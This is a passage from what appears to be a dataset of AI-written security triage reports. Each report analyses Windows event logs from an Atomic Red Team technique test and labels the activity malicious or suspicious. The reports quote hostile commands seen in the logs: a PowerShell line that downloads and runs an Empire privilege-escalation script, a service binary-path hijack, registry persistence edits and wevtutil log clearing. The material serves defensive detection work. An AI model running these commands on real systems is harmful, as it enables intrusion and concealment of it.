   - A suspicious PowerShell command executed with the following script: `powershell.exe & {Stop-Service -Name ""fax"" -force -erroraction silentlycontinue | Out-Null; set-servicebinarypath -name ""fax"" -path ""$env:windir\\system32\\notepad.exe""; start-service -Name ""fax"" -erroraction silentlycontinue | out-null}`. 
   - This command stops a legitimate Windows service (Fax), changes its binary path to a well-known executable (Notepad.exe), and restarts it. This is a common technique used to achieve persistence or privilege escalation, suggesting potential malicious intent.

2. **Security and System Logs**:
   - The logs indicate that the security, system, and PowerShell event logs were cleared by the user `admin_test`. This action can be considered highly suspicious as attackers often clear logs to cover their tracks after malicious activity.

3. **Sysmon Logs**:
   - Numerous entries of `wevtutil.exe cl` command being executed. The `wevtutil` command is known for event log manipulation and clearing. Its presence corroborates the log clearing indication seen in the Security logs.

4. **Process Creation**:
   - Multiple executions of native Windows processes (`hostname.exe`, `whoami.exe`) through PowerShell or unknown means could indicate reconnaissance activities. The execution of `conhost.exe` related to these processes is normal but is worth noting in this sequence of activities.

**Assessment and Conclusion**:
- The behavior observed, particularly the manipulation of the service binary path and the systematic clearing of event logs, suggests a deliberate attempt to perform unauthorized activities on the system and cover up traces.

**Resolution**:
- **MALICIOUS**: The combination of service binary manipulation, log clearing, and suspicious use of PowerShell scripts indicates a high certainty of malicious activity.

**Recommendations**:
1. **Immediate containment**: Isolate the affected host (Server002) from the network to prevent further potential compromise or lateral movement.
2. **Deep review and mitigation**: Conduct a detailed forensic investigation to determine the full scope of the compromise and identify if any other systems have been affected.
3. **Patch and update**: Ensure all systems are up-to-date with the latest security patches to mitigate any exploited vulnerabilities.
4. **Audit and strengthen security policies**: Review and improve security policies, especially around the use of privileged accounts and the logging of security-relevant events to detect similar activities in the future.
5. **User awareness and training**: Conduct training for users on recognizing and reporting suspicious activities, particularly involving the misuse of administrative tools and commands."
Import XML Schedule Task with Hidden Attribute,"Upon analyzing the provided logs, several key points of interest stand out that may indicate suspicious or malicious activity:

1. **Log Clearing Events:**
   - The Security, System, and Windows PowerShell logs were cleared at approximately the same time (`2024-10-22 17:00:45`). There are events with `Event ID: 1102` in Security log and `Event ID: 104` in System log indicating log clearing. The account involved is `admin_test` on `SERVER002`.
   - Log clearing is often an indicator of an attempt to cover tracks after unauthorized or malicious activity.

2. **Windows PowerShell Activity:**
   - PowerShell scripts are invoked with the command to register a scheduled task using an XML file located in the `AtomicRedTeam` directory, which is a well-known simulation and testing framework for testing detection and prevention systems. The command `Invoke-CimMethod -ClassName PS_ScheduledTask -MethodName ""RegisterByXml""` is particularly used, which can be used to perform task registration via scripts which can execute code upon triggering.
   - The presence of `AtomicRedTeam` suggests a testing scenario; however, if not properly accounted for, it might still indicate unauthorized use of the scripts depending on the context.

3. **Sysmon Logs and Event Utilization:**
   - Numerous instances of `wevtutil.exe` being executed with the command `cl`, indicating log clearing (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security` logs), which aligns with the log clearing events noted in the Security and System logs.
   - The logs show high integrity level access with commands executed under `admin_test`, which may suggest elevation of privileges if this account was not intended for these actions.

4. **Process Execution:**
   - Hosts executed standard utilities like `whoami.exe` and `hostname.exe`, which might indicate a user gathering information about the system state and user context.
   - Execution of legitimate Microsoft Edge update processes appears consistent with typical application behavior, suggesting benign activity unless further correlated with unauthorized downloads.

**Assessment and Conclusion:**
- The combination of log clearing, use of PowerShell for task scheduling, and the presence of potentially unauthorized or unexpected administrative actions is suspicious.
- While the presence of `AtomicRedTeam` elements suggests it could potentially be a test, the circumstances surrounding the simultaneous clearing of critical logs, if not explicitly authorized or anticipated, point towards suspicious activity needing further investigation.

**Resolution: SUSPICIOUS**
- The activity in the logs indicates potentially malicious behavior through log deletion and PowerShell scripting that warrants a deeper investigation. Authenticity of `AtomicRedTeam` testing must be verified with administrative logs or change control records.
- Further steps include validating the legitimacy of the `admin_test` user's activities, ensuring that this user account is accounted for, and assessing whether the actions align with an expected simulation or if it necessitates an incident response action for potential compromise."
Shortcut Modification,"After reviewing the provided Windows event logs, I have identified several indicators that suggest potential malicious activity:

1. **Event Log Clearing**:
   - The Security and System logs have been cleared, as indicated by EventID 1102 in the Security log and EventID 104 in the System log. The logs were cleared by the user ""admin_test,"" which is a significant indicator of potential malicious activity, as attackers often clear logs to hide their tracks.

2. **Suspicious Process Execution**:
   - The use of `wevtutil.exe` to clear various logs (Sysmon, Application, System, Security) is noteworthy. This utility is often used by attackers to erase evidence.
   - The execution of commands involving `cmd.exe` with command lines that modify shortcuts to execute `calc.exe` suggests potential attempts to persist or execute unintended applications through altered shortcuts.

3. **Out-of-Order Timestamps**:
   - A time change was noted in EventID 4616, which adjusted the system clock backward. Time manipulation can be used to align cleared logs and events or evade detection based on timestamps. Such activities, especially when seen alongside cleared logs, further support the suspicion of malicious intent.

4. **Processes with Elevated Integrity Levels**:
   - Various processes (`wevtutil.exe`, `whoami.exe`, and `cmd.exe` executing potentially unwanted commands) run with high integrity levels under the ""admin_test"" user, suggesting privilege escalation might have occurred or was attempted.

Based on the analysis of the suspicious actions—especially the log clearance, the use of wevtutil, and time manipulation which are strong indicators of malicious intent—I have classified these events as:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions**:
  - Isolate the affected host from the network to prevent further damage or lateral movement.
  - Perform a comprehensive forensic analysis of the system to understand the full scope of the intrusion.
  - Review other network systems for similar activity or indicators of compromise (IoC).

- **Further Investigation**:
  - Examine user ""admin_test"" activities in detail to determine whether credentials were stolen or misused.
  - Investigate any external connections or unusual network traffic from this host around the timestamp of these events.

- **Long-term Actions**:
  - Enhance monitoring on critical systems for signs of log clearing and time changes.
  - Implement stricter access controls and user monitoring, especially for privileged accounts.
  - Conduct a thorough security audit and consider resetting passwords and reviewing system configurations.

`SeDebugPrivilege` token duplication,"### Detailed Analysis

Upon analyzing the provided Windows event logs, several indicators of suspicious behavior are noted. 

#### Indicators of Potential Compromise:

1. **PowerShell Command Execution:**
   - Multiple entries in the Sysmon and PowerShell logs indicate the execution of PowerShell with the following command:
     ```plaintext
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}
     ```
   - This command attempts to download and execute a script from a GitHub repository associated with the BC-SECURITY/Empire project, which is known to be used in penetration testing and by attackers for privilege escalation. The use of `IEX` (Invoke-Expression) to execute this script is a common technique used in malicious PowerShell activities.

2. **Log Clearing Events:**
   - Security Event ID 1102 (LogFileCleared) and System Event ID 104 indicate that the logs in the Security and System channels were cleared. This action is commonly associated with attempts to cover tracks after unauthorized or malicious activity. The user ""admin_test"" was responsible for this action.

3. **Time Change Activity:**
   - Security Event ID 4616 and System Event ID 1 reveal unauthorized system time changes, which can indicate attempts to manipulate log timestamps to make forensic analysis and correlation more difficult.

#### Assessment

The combination of the suspicious PowerShell command execution, log clearing activities, and time changes strongly suggest malicious activity. The behavior aligns with typical post-exploitation tactics where an attacker seeks to escalate privileges, execute malicious payloads, and erase traces of their presence in the system.

#### Resolution: MALICIOUS

Based on the detailed examination of the logs, the events contained are indicative of malicious activity. This assessment is primarily due to the execution of a known malicious PowerShell script, log file clearances, and system time alterations.

### Recommended Actions

1. **Immediate Isolation:** The affected host should be isolated from the network to prevent further potential spread of malicious activity.
   
2. **Forensic Investigation:** A comprehensive forensic analysis should be conducted to understand the breadth and depth of the compromise, including inspecting any additional malicious payloads and persistence mechanisms.

3. **Patch and Secure:** Ensure that the host and others in the environment are patched and fully secured to prevent re-exploitation through the same or similar vulnerabilities.

4. **Review Access Controls:** Review and enhance access control policies and ensure that only authorized individuals have administrative privileges.

5. **Monitoring and Detection:** Enhance monitoring and detection capabilities to promptly identify any recurrence of these behaviors or other anomalous activities across the network.

6. **Incident Response Plan:** Execute the organization's incident response plan and ensure that all response actions and impacts are well-documented for further analysis and reporting."
Process Hollowing in Go using CreateProcessW WinAPI,"### Detailed Analysis

1. **System and Security Logs:**
   - **Event ID 104 & 1102 (Log Clearing):** Logs indicate that the event logs for the System, Windows PowerShell, and Security were cleared using the command-line utility `wevtutil`. This is often an attempt to cover up nefarious activities and is a clear indicator of suspicious behavior.
   - **Time Change Events (Event ID 4616):** The system time was altered back by approximately 26 seconds. While time changes can occur for legitimate reasons, coupled with log clearing activities, it becomes suspicious as it might indicate an attempt to interfere with time-based log traces.
   - **Event ID 4624 (Successful Logon):** An account named ""admin_test"" logged in using NTLM authentication from the workstation named ""DESKTOP-3HL5B2P"". This needs further verification to ensure it was an authorized access.

2. **Sysmon Logs:**
   - The series of events in the Sysmon log show multiple instances of `wevtutil.exe` being used to clear logs for different channels (System, Security, PowerShell, and Application). This was executed with high integrity, indicating this was done with elevated permissions.
   - The command-line usage of `wevtutil.exe` specifically for log clearing is highly indicative of an attempt to erase tracks.
   - The usage of `powershell.exe` to run scripts located in a temporary directory, linked with ""AtomicRedTeam,"" is a known simulation for testing defenses and detection capabilities, known as adversarial simulation. However, without confirmation that this was intentionally conducted by a red team or security testing team, it remains suspicious.

3. **PowerShell Logs:**
   - multiple events indicate that PowerShell was invoked with a command that involved executing `CreateProcess.exe`, suggesting potential execution of further processes or scripts from within PowerShell. This usage pattern fits known attack techniques of leveraging PowerShell for execution.

4. **Risks Identified:**
   - Log clearing: Attempt to hide malicious activity.
   - Time change: Potential attempt to disrupt log timeline consistency.
   - Usage of security testing tools/scripts without prior authorization.

### Assessment and Recommendations

**Assessment:**
- The activities in the logs align closely with known malicious behaviors, particularly the clearing of logs and the usage of tools associated with simulation or attack scenarios. However, the use of tools like Atomic Red Team could suggest this was a planned exercise if conducted by an internal security team.

**Recommendations:**
- Verify with the organization's security team whether this activity was part of a sanctioned red team exercise or penetration test.
- If this was unauthorized, escalate immediately as a security incident.
- Review access permissions and ensure all administrative actions are documented and justified.
- Increase monitoring on the ""admin_test"" account and related systems, looking for any other deviations or unusual behavior patterns.
- Consider tightening security policies and ensuring endpoint protection solutions are capable of detecting and preventing these types of activities.

### Resolution
- **SUSPICIOUS**: The activities suggest potential malicious actions, but there is also a chance it is a simulated attack for security assessments; further investigation is necessary to confirm the intent and authorization of the activities."
Winlogon HKLM Shell Key Persistence - PowerShell,"Upon reviewing the provided log data, several indicators of potentially malicious activity have been identified. The analysis is as follows:

### Key Findings:

1. **Clearing of Event Logs:**
   - There are several instances of event log clearing activities:
     - Application log cleared by `wevtutil.exe cl Application`
     - System log cleared by `wevtutil.exe cl System`
     - Windows PowerShell log cleared by `wevtutil.exe cl ""Windows PowerShell""`
     - Security log cleared, as shown by EventID 1102 in the Security log.
   - All these actions were carried out by the user `admin_test`. Clearing event logs is a known tactic to cover tracks after malicious activities.

2. **Suspicious PowerShell Activity:**
   - PowerShell scripts were executed to modify registry settings, specifically targeting `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` to include `cmd.exe` in the `Shell` value. This alteration can facilitate unauthorized shell access upon user logon, a technique often used by attackers to establish persistence or execute additional commands post-compromise.

3. **Privilege and Integrity Context:**
   - The activities related to PowerShell and log clearing were executed under high integrity contexts, indicating that the actions were performed with elevated privileges, making the operations highly impactful if they are indeed malicious.

4. **Use of System Tools for Potential Malicious Intent:**
   - System utilities like `wevtutil.exe` and manipulation of winlogon Shell registry keys are legitimate tools and procedures often abused by malware actors to evade detection and maintain persistence.

### Assessment:
- **Resolution:** MALICIOUS 
  - The combination of event log clearing, registry alteration for persistence, and the use of high privileges for potentially illicit actions points towards a compromise rather than benign administrative maintenance.

### Recommendations:
1. **Immediate Actions:**
   - Investigate the `admin_test` account activities further to determine the origin and intention behind these actions.
   - Check for unauthorized changes in the system and verify other hosts for similar patterns.
   - Conduct a thorough security audit on `Server002`, checking for unauthorized accounts, running processes, and system configurations.

2. **Containment and Remediation:**
   - If not already done, isolate `Server002` from the network to prevent further potential spread or callback to attacker infrastructure.
   - Roll back unauthorized registry changes to eliminate persistence mechanisms.
   - Reset credentials for any user accounts that may have been compromised.

3. **Monitoring and Defense Enhancement:**
   - Implement stricter monitoring of administrative activities, particularly the execution of PowerShell scripts and log manipulation commands.
   - Deploy advanced threat detection and response tools that can alert to and mitigate misuse of administrative utilities and suspicious process executions.

Implementing these measures will enhance the security posture and help prevent similar incidents in the future."
Reg Key Run,"Based on the provided Windows event logs, the following key points are worth noting:

**1. Log Clearing Activity:**
   - The logs reveal systematic clearing of three critical logs: System, Security, and Windows PowerShell logs. This is captured by events with EventID 104 for both the System and Windows PowerShell logs and EventID 1102 for the Security log. The clearing of these logs is performed by the user 'admin_test', indicating an attempt to remove traces of activity, which is a common tactic used by malicious actors to cover their tracks.
   - The specific command used for clearing logs involves `wevtutil.exe`, which is a legitimate command-line utility for managing Windows event logs, but its misuse for clearing logs can indicate malicious intent, especially when conducted concurrently across multiple logs.

**2. Suspicious Registry Modification:**
   - There is an event where `cmd.exe` is used to modify the Windows Registry to add a new entry in `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, which is a typical persistence mechanism used by attackers. The registry key adds a value named ""Atomic Red Team"" which points to an executable ""C:\Path\AtomicRedTeam.exe"". While ""Atomic Red Team"" is known for testing security tools, in this context, it is unusual unless authorized for controlled testing. 

**3. Network and Privilege Activity:**
   - There are no direct indicators of network intrusion or privilege escalation attempts in the logs. However, the presence of cleared logs, especially security-related logs, could mean that such information might have been wiped clean.

**4. Legitimate Activity:**
   - The presence of activities around kernel general and time service updates, with events related to time synchronization (via `time.windows.com`), appears to be normal system maintenance activity and not inherently malicious.

**Risk Assessment and Threat Identification:**
- The primary red flags are the clearing of event logs systematically and the unauthorized addition of a registry run key for persistence. These activities collectively point towards highly suspicious behavior that could indicate malicious activity.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough check to confirm if ""Atomic Red Team"" registry modification was authorized as part of a security testing exercise. If unauthorized, treat it with suspicion and perform incident response protocols.
- Investigate the user 'admin_test' for unauthorized access or insider threat. Assess any recent changes in account privileges or anomalies in other logs.
- Verify the integrity of systems involved, considering forensic investigations to retrieve potentially cleared/deleted logs.
- Implement monitoring and alerting mechanisms to detect subsequent log-clearing activities or registry modifications.
- Engage with IT security teams to quarantine and analyze the executable path listed in the registry modification."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"After analyzing the provided Windows event logs, the following observations can be made:

1. **Clearing of Event Logs**: There are multiple instances where the event logs were cleared, which is typically suspicious behavior. The logs for the Application, System, and Security channels were cleared (Event IDs: Sysmon EventID 5, Security EventID 1102, and System EventID 104). This action was performed by the user `SERVER002\admin_test`, which may indicate an attempt to cover tracks of potentially malicious activities.

2. **Usage of wevtutil.exe**: There are multiple instances showing the execution of the `wevtutil.exe` command-line utility, specifically clearing event logs (`cl Application`, `cl System`, and `cl Security`). This aligns with log clearing activities and raises concerns about the intent behind these actions, as `wevtutil.exe` is often used in post-exploitation scenarios to hide malicious behavior.

3. **Time Change Events**: There are events indicating modification of the system time (Security EventID 4616, and System EventID 1). Time manipulation can be used to forge timestamps and possibly evade detection mechanisms.

4. **Suspicious PowerShell Command**: A PowerShell command was executed that attempted to modify the registry key `HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`. This activity indicates potential persistence mechanisms, possibly to maintain malware across reboots.

5. **Microsoft Edge Updates**: There are multiple logs related to Microsoft Edge updates which primarily involve NT AUTHORITY\SYSTEM. This activity appears to be legitimate as it relates to updates for the Microsoft Edge browser, a common and benign process.

Based on these key observations, particularly the clearing of event logs, usage of `wevtutil.exe` for clearing logs, time manipulation, and suspicious PowerShell activity, these logs indicate behavior consistent with possible malicious intent rather than mere benign activities.

### Resolution
- **MALICIOUS**: The activity of log clearing, usage of a potentially malicious PowerShell command, and potential time manipulation strongly suggest an attempt to obfuscate malicious activity. Immediate further investigation and remediation actions are recommended to determine the scope of the compromise and to mitigate further threats."
Authentication Package,"Based on the provided logs, several events raise concerns about potential malicious activity:

1. **System Log - Event Log Clearance:** 
   - Multiple event logs, including the System, Windows PowerShell, and Security logs, were cleared by the user ""admin_test"" (EventID: 104 and 1102). This activity is suspicious as attackers often clear logs to cover their tracks.

2. **Sysmon Log - Unusual Commands and Processes:**
   - The execution of `wevtutil.exe` was used to clear logs (e.g., ""cl System"" and ""cl Application""), indicating attempts to remove evidence.
   - A PowerShell command containing `reg add` was executed to modify registry settings related to Authentication Packages, with an attempt to add a suspicious DLL (""package.dll"") to the LSA authentication packages. This is indicative of an attempt at persistence or credential theft (EventID: 17984, 17986).
   - The source paths and actions suggest usage of a technique similar to those used in the Atomic Red Team's T1547.002 adversary emulation.

3. **Security Log - Privilege Escalation:**
   - The user ""admin_test"" was granted high-level privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others, which pose significant security risks if granted improperly (EventID: 4672).
   - An NTLM logon (EventID: 4624) occurred from a remote workstation, which may need verification to ensure this is legitimate.

4. **PowerShell Log - Malicious Command Execution:**
   - The PowerShell logs contain commands that modify the system's registry, aiming to compromise authentication components. This is an indication of attempted system compromise and possibly credential theft.

5. **Indicators of Persistence and Advanced Techniques:**
   - The usage of registry modifications and potential injection of dll files into system processes points toward advanced persistence mechanisms and inform the possibility of a more comprehensive attack.

**Resolution: MALICIOUS**

The activity identified is highly indicative of malicious intent, particularly given the use of techniques aimed at persistence, credential theft, and manipulation of system logs. The execution of PowerShell commands designed to alter registry keys related to system authentication processes is a direct concern for system integrity and data security.

**Guidance on How to Proceed:**
- Immediately isolate the affected host to prevent further spread or damage.
- Conduct a thorough forensic analysis to understand the full extent of the breach and identify all compromised components.
- Reverse any unauthorized registry changes and remove any unauthorized files (like ""package.dll"") from the system.
- Suspend or review the ""admin_test"" account credentials, checking for any unauthorized activities.
- Notify relevant security and IT teams to reinforce monitoring and strengthen auditing of systems, especially on privileges and process executions.
- Review network traffic logs to trace any external connections that might have been established during the incident.
- Consider an organization-wide security review and initiate a response plan to mitigate future risks."
LockBit Black - Modify Group policy settings -Powershell,"In the provided Windows event logs, several indications of potential compromise or suspicious activity can be observed. Here's a detailed analysis:

1. **Use of PowerShell with Suspicious Command Line:**
   - The Sysmon log entries show the execution of `powershell.exe` with a command line that involves modifications to registry keys related to Group Policy refresh times and SmartScreen settings. This behavior is atypical and potentially malicious as it could indicate attempts to manipulate system policies or disable security features:
     ```plaintext
     CommandLine: ""powershell.exe"" & {...}
     ```
   - The PowerShell log confirms these command lines were executed, and such registry changes are usually not standard operations and often seen in malicious activities aimed at circumventing security protections.

2. **Clearing of Event Logs:**
   - There are multiple instances where system and Windows PowerShell event logs were cleared (`EventID: 104` and `EventID: 1102`). This is suspicious behavior as attackers often clear logs to erase traces of their activities or hide their footprint:
     ```plaintext
     LogFileCleared by admin_test on Server002
     ```

3. **Unusual Activity in the Use of `wevtutil.exe`:**
   - The frequent execution of `wevtutil.exe` in conjunction with the clearing of logs as shown in the Sysmon logs may suggest unauthorized access or an attempt to manipulate system logs.

4. **High Integrity Level Operations:**
   - The actions are being performed under a high integrity level, increasing the risk associated with potential compromise as it implies privileged access rights are being leveraged.

5. **Potentially Anomalous Operations:**
   - Execution of commands like `hostname.exe` and `whoami.exe` with high integrity levels immediately after the suspicious PowerShell activity, suggest reconnaissance attempts to gather information about the system or the user context in which scripts are being executed.

Based on these findings, the logs strongly suggest indicators of malicious activity due to unauthorized manipulation of system settings, clearing of security logs, and abnormal command execution patterns. 

### Resolution: MALICIOUS

**Guidance:**
- **Immediate Incident Response:** Initiate an incident response process to further investigate and contain the threat.
- **Forensic Analysis:** Acquire a memory dump and disk image for forensic analysis to understand the extent of the breach.
- **Audit Access Policies:** Review user account, especially `admin_test`, for unauthorized access activities.
- **Strengthening Security Controls:** Reinforce endpoint protection, ensure all security patches are up-to-date, and enhance logging and monitoring to detect such anomalies in the future.
- **User Education:** Educate users on security best practices to prevent reuse of credentials or unwarranted administrative access."
Azure AD Application Hijacking - App Registration,"Upon reviewing the provided Windows event logs, there are several events and actions that stand out as potentially suspicious or indicative of malicious activity:

1. **Event Log Clearing**: 
   - **Security Event ID 1102** and **System Event ID 104** indicate that the security and system event logs have been cleared by the user ""admin_test"". The clearing of logs is often a tactic used by malicious actors to cover their tracks after compromising a system.

2. **Suspicious PowerShell Activity**:
   - There is a detailed PowerShell command execution logged, initiating with `powershell.exe` involving interactions with Azure AD and creation of a self-signed certificate (`New-SelfSignedCertificate`). The script also mentions ""Application Hijacking"" and includes operations like `Connect-AzureAD`, `Get-AzureADApplication`, and `New-AzureADApplicationKeyCredential`. These actions are capable of modifying Azure cloud configurations and could be an attempt to illicitly gain persistent access or elevate privileges.

3. **Sysmon Logs**:
   - Numerous Sysmon Event ID 1 entries show processes like `wevtutil.exe` being executed, which is consistent with clearing event logs. Furthermore, a PowerShell script running with high privileges (`IntegrityLevel: High`) along with commands akin to those used in malicious scripts, suggests malicious intent.
   
4. **Security Event 4672**:
   - This event logs special privileges assigned to the SYSTEM account around the time of suspicious activities. While this is not uncommon, in the context of other malicious indicators, it raises concerns.

5. **Failed Credential Access Attempts**:
   - Security Event ID 5379 shows failed attempts to access credentials, which might indicate password guessing or credential testing activities.

Given these findings, the evidence strongly suggests that there has been a potential compromise of the system. The combination of unusual PowerShell activity, log clearing, and attempts to manipulate Azure applications reflects the patterns of a security breach or intrusion attempt.

**Assessment**: MALICIOUS

**Recommendation**:
1. Isolate the affected host immediately to prevent further potential lateral movement or data exfiltration.
2. Conduct a full forensic investigation on `Server002` to determine the full extent of activities performed during this time.
3. Review Azure account activities for unauthorized changes or access.
4. Rotate credentials and review access permissions across potentially impacted systems.
5. Restore affected systems from a known good backup if the integrity cannot be assured.
6. Implement SIEM and endpoint monitoring solutions to detect similar activities in the future."
Add Federation to Azure AD,"Upon reviewing the provided logs, the following key observations and suspicious behaviors were identified:

1. **Usage of Wevtutil for Clearing Event Logs**: 
   - Observations show multiple occurrences of `wevtutil.exe` being used with specific command lines like `""wevtutil.exe cl System""` and `""wevtutil.exe cl Security""`. This utility is commonly used to clear Windows event logs, which could indicate an attempt to cover tracks after performing suspicious activity. 
   - Logs indicate that at least three different channels (`System`, `Windows PowerShell`, and `Security`) were cleared by the user `admin_test`, evidenced by Event ID 104 in the System log and Event ID 1102 in the Security log.

2. **PowerShell Activity**:
   - There are PowerShell commands executed that involve sensitive operations, including the use of `AADInternals` and attempts to manipulate Azure AD configurations, such as trying to federate a domain (`contoso.com`). This activity involves using specific PowerShell modules like AzureAD and functions like `ConvertTo-AADIntBackdoor`, which can be leveraged for unauthorized access or manipulation of Azure AD.
   - The command attempts to use hard-coded credentials (logins and passwords), indicative of potential automation of attacks or setup of persistent unauthorized access points.

3. **High Integrity Levels**:
   - Many of the processes, including powershell.exe and wevtutil.exe, are running at a high integrity level, highlighting that the executed commands have higher system privileges, which could facilitate system alterations or unauthorized access more effectively.

4. **Multiple System and Sysmon Events**:
   - Repeated creation and termination of processes such as `conhost.exe` following the use of `wevtutil.exe` indicate typical behavior associated with hiding command line tool usage or concealing running processes.

5. **Unusual User Activity**:
   - The user `SERVER002\\admin_test` is linked to various command executions and log clearances within a very short time frame, which is uncharacteristic of typical administrative behavior if not planned maintenance.

Given the above findings:

**Assessment**:
The activities documented in the logs represent sophisticated attempts to obfuscate actions and potentially establish unauthorized access to the domain (Azure AD manipulation attempt). Given the execution of sensitive PowerShell scripts, use of administrative-level tools to clear logs, and the overall context, these actions are consistent with malicious intent.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. Immediately isolate the affected system (Server002) to prevent further unauthorized access or potential data exfiltration.
2. Conduct a full forensic investigation on Server002 to determine the extent of any breach or data manipulation.
3. Review and revoke any potentially compromised credentials, especially those associated with the `admin_test` account and any Azure AD configurations.
4. Validate the integrity of Azure AD domains and configurations, especially focusing on the attempted changes noted in the logs.
5. Reinforce logging mechanisms and monitoring, ensuring event logs are securely archived and can withstand potential tampering.
6. Consider engaging with cybersecurity incident response experts to assist in containing and remediating this security incident."
Shellcode execution via VBA,"After careful analysis of the provided Windows event logs, the following observations are made:

1. **PowerShell Execution with Suspicious Command:**
   - There are multiple instances where PowerShell is initiated with a suspicious command line. The command line includes a script retrieved from a GitHub repository known for Atomic Red Team tests: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`.
   - This script is executed via `Invoke-Maldoc`, which is a known technique for simulating or executing malicious documents for testing purposes. The presence of this script and its execution is highly suspicious and often used in malware activity simulation.

2. **Event Log Clearing:**
   - The logs show multiple instances of event log clearing (EventID 1102 for the Security log and EventID 104 for System and PowerShell logs). This activity is perfomed by the same user, `admin_test`, and is often used by attackers to cover their tracks.

3. **High Integrity Level Execution:**
   - The processes, including PowerShell and wevtutil.exe (used for event log clearing), are executed with a High integrity level, indicating they have significant privileges, which could allow for malicious activity to compromise the system further.

4. **Series of Suspicious Parent-Child Process Relationships:**
   - Processes like `wevtutil.exe` and `conhost.exe` are spawned frequently in patterns that match the execution of scripts or commands more typically seen in post-exploitation activities. The `conhost.exe` instances are likely created to facilitate these PowerShell commands.

### Assessment:
The activities observed in the logs suggest actions typically aligned with malicious behavior, including the execution of potentially harmful scripts, and subsequent event log clearing to hide traces of these actions. The repeated use of high-integrity PowerShell executions to run external scripts further raises suspicion of direct malicious intent.

### Resolution:
**MALICIOUS** - The logs contain convincing evidence of potentially malicious activities, including the execution of external scripts designed for obfuscation or simulated attack purposes, coupled with log-clearing behavior indicative of attempts to conceal those actions.

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - Isolate the involved host `Server002` from the network to prevent further potential spread or communication with external command-and-control servers.
   
2. **Comprehensive Investigation:**
   - Conduct a thorough forensic investigation on `Server002` to capture any malicious payloads, understand the full scope of the compromise, and identify potential entry points.
   
3. **User Account and Permissions Review:**
   - Review the user account `admin_test` for any unauthorized changes or activities and determine if additional accounts have been compromised.
   
4. **Monitor Network and Hosts Across the Environment:**
   - Deploy increased monitoring and alerting on similar activities across the network to detect any further spread or similar malicious behaviors on other hosts.
   
5. **Incident Response and Remediation:**
   - Follow your organization's incident response plan to recover and fortify systems, including patching vulnerabilities used for access and ensuring logs are monitored and alerts set for similar future activities."
Process Injection via C#,"Upon analyzing the given logs, several indicators raise concerns about potential malicious activities. Here’s a detailed analysis based on the provided logs:

### Observations:

1. **PowerShell Activity & Event Log Clearing:**
   - Multiple instances of `wevtutil.exe` are observed with the command line arguments to clear the event logs for different channels, including Sysmon, Application, System, Security, and Windows PowerShell (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`).
   - This is particularly suspicious as it indicates an attempt to cover tracks which is a common technique used by malicious actors to evade detection.

2. **Anomalous Command Execution:**
   - Execution of `cmd.exe` with a suspicious command-line involving a path in a temporary directory (`T1055.exe`) which refers to ""AtomicRedTeam"", a known security testing framework used to simulate adversary techniques. The specific technique `T1055` refers to process injection which can be malicious if not used in a controlled security testing environment.

3. **Time Manipulation:**
   - Several logs report adjustments to the system time (EventID: 4616 in the Security log and event adjustments in the System log) which could indicate an attempt to confuse forensics or log monitoring by altering the timestamps.

4. **High Integrity Level Processes:**
   - Observed processes such as `PowerShell.exe`, `wevtutil.exe`, and `cmd.exe` are running with a high integrity level, indicating they were executed with elevated privileges.

5. **Event Log Clearance:**
   - The logs note that an account (`admin_test`) was involved in clearing the logs. This account activity aligns with the execution of `wevtutil.exe` for event log clearance, supporting the hypothesis of log tampering for obfuscation purposes.

6. **Use of Process Injection Testing Tool:**
   - The execution path and process name suggest an execution of a tool to test process injection (`T1055.exe`), which in an uncontrolled environment might indicate exploitation tests or malicious activity.

### Assessment:

Based on the observations, these logs exhibit signs consistent with malicious activity, particularly actions taken to evade detection (event log clearing) and potentially harmful testing or exploitation of system vulnerabilities (process injection testing). 

### Resolution:

- **MALICIOUS**: The combination of event log tampering, use of a command line utility typical in security evasion, execution paths, and the involvement of known testing frameworks indicates malicious intent without evidence of explicit benign testing scenarios or authorization. Immediate response actions, including isolation of the affected host and comprehensive forensic analysis, are recommended to assess the scope of the breach and prevent further unauthorized activities."
Azure AD - adding permission to application,"Based on the analysis of the provided Windows event logs, several indicators of potentially malicious activity emerge:

1. **PowerShell Activity**: There are multiple instances of PowerShell being executed with what appears to be scripts for Azure Active Directory manipulation. The use of `ConvertTo-SecureString` and other PowerShell commands attempting to connect to AzureAD, create applications, and assign roles suggests possible unauthorized configuration changes or privilege escalation attempts, possibly indicative of credential theft or lateral movement within the network.

2. **Clearance of Event Logs**: There are events where the Windows Security and System logs were cleared (`Event ID 1102` and `Event ID 104`). This is a common tactic to cover tracks after executing suspicious or malicious activities.

3. **Process Executions**: The execution of processes such as `wevtutil.exe` to clear logs followed by the execution of various scripting engines (PowerShell) alongside unnecessary and potentially suspicious commands could signify attempts to obfuscate actions taken by the perpetrator.

4. **Unusual Usage Pattern by `admin_test`**: The user account `admin_test` is responsible for executing several high-integrity level commands, including tool usage that a typical non-administrative user should not perform. Coupled with the log clearance attempts, it raises suspicion about either misuse or compromise of this account.

5. **Conhost Executions**: While most `conhost.exe` activities can be benign, the close timing of multiple executions related to other suspicious activities (like PowerShell and log clearance) adds to overall suspicion.

Given these points:

- The PowerShell commands indicate potential attempts to create, modify, or gain access and permissions in Azure Active Directory using potentially stolen credentials.
- The clearing of logs further supports the likelihood of an attempt to obscure malicious activity.

**Resolution: MALICIOUS**

The collected evidence strongly suggests malicious activity due to:
- The executed PowerShell commands aimed at accessing Azure resources.
- The event log clearance, which is a strategy often used to hide tracks after executing malicious activities.

**Guidance on How to Proceed:**
